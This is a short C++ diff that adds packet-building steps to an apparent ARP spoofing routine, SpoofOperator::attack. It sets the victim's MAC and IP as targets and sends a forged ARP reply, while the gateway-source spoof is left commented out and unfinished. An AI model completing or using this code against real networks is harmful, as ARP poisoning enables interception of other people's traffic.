@@ -20,10 +20,14 @@ int SpoofOperator::attack(std::string target_ip)
     // set opcode = 2
     arp_operator->set_mode(ARP_REPLY);
     // set pdst = target_ip
-    
     // set hwdst = target_mac
+    arp_operator->set_ether_target(ip2mac_map->find(target_ip)->second);
+    // arp_operator->set_ether_source
+    arp_operator->set_target(target_ip, ip2mac_map->find(target_ip)->second);
     // set psrc = spoof_ip
+    // arp_operator->set_source(gateway_ip, 
     // send packet
+    arp_operator->send();
     return 0;
 }
 
